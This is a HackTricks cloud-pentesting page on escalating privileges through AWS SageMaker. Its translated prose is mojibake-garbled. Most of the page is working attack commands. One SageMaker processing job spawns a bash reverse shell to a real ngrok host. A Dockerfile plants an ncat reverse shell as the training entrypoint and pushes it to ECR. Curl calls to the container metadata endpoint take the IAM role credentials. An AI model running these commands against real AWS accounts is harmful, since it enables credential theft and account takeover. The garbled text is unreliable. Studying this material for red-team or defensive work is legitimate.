# AWS - Sagemaker Privesc

## AWS - Sagemaker Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

–ü–æ—á–Ω—ñ—Ç—å —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –Ω–æ—Ç–∞—Ç–Ω–∏–∫ –∑ IAM —Ä–æ–ª–ª—é, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –Ω—å–æ–≥–æ:
```bash
aws sagemaker create-notebook-instance --notebook-instance-name example \
--instance-type ml.t2.medium \
--role-arn arn:aws:iam::<account-id>:role/service-role/<role-name>
```
–í—ñ–¥–ø–æ–≤—ñ–¥—å –ø–æ–≤–∏–Ω–Ω–∞ –º—ñ—Å—Ç–∏—Ç–∏ –ø–æ–ª–µ `NotebookInstanceArn`, —è–∫–µ –º—ñ—Å—Ç–∏—Ç–∏–º–µ ARN –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –±–ª–æ–∫–Ω–æ—Ç–∞. –ü–æ—Ç—ñ–º –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ API `create-presigned-notebook-instance-url`, —â–æ–± –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ URL, —è–∫–∏–π –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –±–ª–æ–∫–Ω–æ—Ç–∞, —è–∫ —Ç—ñ–ª—å–∫–∏ –≤—ñ–Ω –±—É–¥–µ –≥–æ—Ç–æ–≤–∏–π:
```bash
aws sagemaker create-presigned-notebook-instance-url \
--notebook-instance-name <name>
```
–ü–µ—Ä–µ–π–¥—ñ—Ç—å –∑–∞ URL-–∞–¥—Ä–µ—Å–æ—é –≤ –±—Ä–∞—É–∑–µ—Ä—ñ —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ \`Open JupyterLab\` —É –≤–µ—Ä—Ö–Ω—å–æ–º—É –ø—Ä–∞–≤–æ–º—É –∫—É—Ç—ñ, –ø–æ—Ç—ñ–º –ø—Ä–æ–∫—Ä—É—Ç—ñ—Ç—å –≤–Ω–∏–∑ –¥–æ –≤–∫–ª–∞–¥–∫–∏ ‚ÄúLauncher‚Äù —ñ –≤ —Ä–æ–∑–¥—ñ–ª—ñ ‚ÄúOther‚Äù –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É ‚ÄúTerminal‚Äù.

–¢–µ–ø–µ—Ä –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –º–µ—Ç–∞–¥–∞–Ω–∏—Ö IAM Role.

**Potential Impact:** Privesc –¥–æ —Ä–æ–ª—ñ —Å–ª—É–∂–±–∏ sagemaker, —â–æ –≤–∫–∞–∑–∞–Ω–∞.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

–Ø–∫—â–æ –Ω–∞ –Ω—å–æ–º—É –≤–∂–µ **–∑–∞–ø—É—â–µ–Ω—ñ Jupyter –Ω–æ—É—Ç–±—É–∫–∏** —ñ –≤–∏ –º–æ–∂–µ—Ç–µ —ó—Ö –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `sagemaker:ListNotebookInstances` (–∞–±–æ –≤–∏—è–≤–∏—Ç–∏ —ó—Ö –±—É–¥—å-—è–∫–∏–º —ñ–Ω—à–∏–º —Å–ø–æ—Å–æ–±–æ–º). –í–∏ –º–æ–∂–µ—Ç–µ **–∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ URL –¥–ª—è –Ω–∏—Ö, –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω–∏—Ö –¥–æ—Å—Ç—É–ø —ñ –≤–∫—Ä–∞—Å—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, —è–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ç–µ—Ö–Ω—ñ—Ü—ñ**.
```bash
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name <name>
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** Privesc –¥–æ —Ä–æ–ª—ñ —Å–ª—É–∂–±–∏ sagemaker, —â–æ –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∞.

### `sagemaker:CreateProcessingJob,iam:PassRole`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ **sagemaker –≤–∏–∫–æ–Ω–∞—Ç–∏ –æ–±—Ä–æ–±–∫—É —Ä–æ–±–æ—Ç–∏** –∑ –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ—é —Ä–æ–ª–ª—é sagemaker. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∫–∞–∑–∞—Ç–∏ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞, —è–∫–∏–π –±—É–¥–µ –∑–∞–ø—É—â–µ–Ω–æ –≤ **—É–ø—Ä–∞–≤–ª—è—î–º–æ–º—É AWS ECS –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ**, —ñ **–≤–∏–∫—Ä–∞—Å—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ—ó IAM —Ä–æ–ª—ñ**.
```bash
# I uploaded a python docker image to the ECR
aws sagemaker create-processing-job \
--processing-job-name privescjob \
--processing-resources '{"ClusterConfig": {"InstanceCount": 1,"InstanceType": "ml.t3.medium","VolumeSizeInGB": 50}}' \
--app-specification "{\"ImageUri\":\"<id>.dkr.ecr.eu-west-1.amazonaws.com/python\",\"ContainerEntrypoint\":[\"sh\", \"-c\"],\"ContainerArguments\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14920 0>&1\\\"\"]}" \
--role-arn <sagemaker-arn-role>

# In my tests it took 10min to receive the shell
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" #To get the creds
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** Privesc –¥–æ —Ä–æ–ª—ñ —Å–ª—É–∂–±–∏ sagemaker, —â–æ –≤–∫–∞–∑–∞–Ω–∞.

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∑–º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–∞–≤—á–∞–ª—å–Ω—É –∑–∞–¥–∞—á—É, **–∑–∞–ø—É—Å–∫–∞—é—á–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä** –Ω–∞ –Ω—ñ–π –∑ **–¥–æ–¥–∞–Ω–æ—é —Ä–æ–ª–ª—é**. –û—Ç–∂–µ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ –≤–∫—Ä–∞—Å—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ä–æ–ª—ñ.

{% hint style="warning" %}
–¶–µ–π —Å—Ü–µ–Ω–∞—Ä—ñ–π —Å–∫–ª–∞–¥–Ω—ñ—à–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏, –Ω—ñ–∂ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –æ–±—Ä–∞–∑ Docker, —è–∫–∏–π –Ω–∞–¥—ñ—à–ª–µ rev shell –∞–±–æ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É (–≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –∫–æ–º–∞–Ω–¥—É –∑–∞–ø—É—Å–∫—É –≤ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –Ω–∞–≤—á–∞–ª—å–Ω–æ—ó –∑–∞–¥–∞—á—ñ).
```bash
# Create docker image
mkdir /tmp/rev
## Note that the trainning job is going to call an executable called "train"
## That's why I'm putting the rev shell in /bin/train
## Set the values of <YOUR-IP-OR-DOMAIN> and <YOUR-PORT>
cat > /tmp/rev/Dockerfile <<EOF
FROM ubuntu
RUN apt update && apt install -y ncat curl
RUN printf '#!/bin/bash\nncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh' > /bin/train
RUN chmod +x /bin/train
CMD ncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh
EOF

cd /tmp/rev
sudo docker build . -t reverseshell

# Upload it to ECR
sudo docker login -u AWS -p $(aws ecr get-login-password --region <region>) <id>.dkr.ecr.<region>.amazonaws.com/<repo>
sudo docker tag reverseshell:latest <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
sudo docker push <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
```
{% endhint %}
```bash
# Create trainning job with the docker image created
aws sagemaker create-training-job \
--training-job-name privescjob \
--resource-config '{"InstanceCount": 1,"InstanceType": "ml.m4.4xlarge","VolumeSizeInGB": 50}' \
--algorithm-specification '{"TrainingImage":"<account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell", "TrainingInputMode": "Pipe"}' \
--role-arn <role-arn> \
--output-data-config '{"S3OutputPath": "s3://<bucket>"}' \
--stopping-condition '{"MaxRuntimeInSeconds": 600}'

#To get the creds
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
## Creds env var value example:/v2/credentials/proxy-f00b92a68b7de043f800bd0cca4d3f84517a19c52b3dd1a54a37c1eca040af38-customer
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** Privesc –¥–æ —Ä–æ–ª—ñ —Å–ª—É–∂–±–∏ sagemaker, —â–æ –≤–∫–∞–∑–∞–Ω–∞.

### `sagemaker:CreateHyperParameterTuningJob`, `iam:PassRole`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∑–º–æ–∂–µ (–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ) —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Ä–æ–±–æ—Ç—É –∑ –Ω–∞–≤—á–∞–Ω–Ω—è –≥—ñ–ø–µ—Ä–ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤**, **–∑–∞–ø—É—Å–∫–∞—é—á–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä** –Ω–∞ –Ω—ñ–π –∑ **–¥–æ–¥–∞–Ω–æ—é —Ä–æ–ª–ª—é**.\
&#xNAN;_&#x49; –Ω–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞–≤ —á–µ—Ä–µ–∑ –±—Ä–∞–∫ —á–∞—Å—É, –∞–ª–µ –≤–∏–≥–ª—è–¥–∞—î –ø–æ–¥—ñ–±–Ω–æ –¥–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ—Ö –µ–∫—Å–ø–ª–æ–π—Ç—ñ–≤, –Ω–µ —Å–æ—Ä–æ–º—Ç–µ—Å—è –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ PR –∑ –¥–µ—Ç–∞–ª—è–º–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó._

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
